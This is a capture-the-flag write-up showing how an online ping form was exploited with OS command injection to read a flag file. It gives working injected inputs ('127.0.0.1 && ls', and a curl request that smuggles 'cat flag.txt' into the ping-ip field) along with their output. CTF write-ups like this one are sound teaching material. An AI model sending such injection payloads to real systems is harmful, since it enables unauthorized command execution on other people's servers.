IT Tools
========

## Challenge info:

There's an app that allows us to run commands on the web server. Maybe there is a flag there somewhere?
http://challenges.matrix8.net/ittools/

## Solution:

Visiting the linked site presents a simple page with a form box; checking the source revealed nothing interesting and the lack of usual ancillary pages such as robots.txt suggested the vulnerability was limited to this page.
The page was meant to represent an online ping utility, users would enter an IP address and the server hosting the page would ping the entered address to check if there was a server available at that address; since this seemed to be the main method of interaction with the website, the next step would be to check what the service allows besides IP addresses.
Asking the service to ping wikipedia.org was successful so letters were allowed, so the next step is to check if commands can be submitted through the form.
Asking the server to ping `127.0.0.1; ls` was not successful:
```
ping: ls: No address associated with hostname
```
However, trying the variant `127.0.0.1 && ls` was successful, indicating both that command injection is feasible and how to find the flag:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms
css
flag.txt
images
index.php
```
Thus the flag could be obtained by `cat`ing the file flag.txt:
```
$ curl -s -d tool=ping -d ping-ip='127.0.0.1 %26%26 cat flag.txt' http://challenges.matrix8.net/ittools/ | grep Equifax
Equifax{didnt_sanitize_user_input_and_it_got_used_for_command_injection_169f9a6}
```
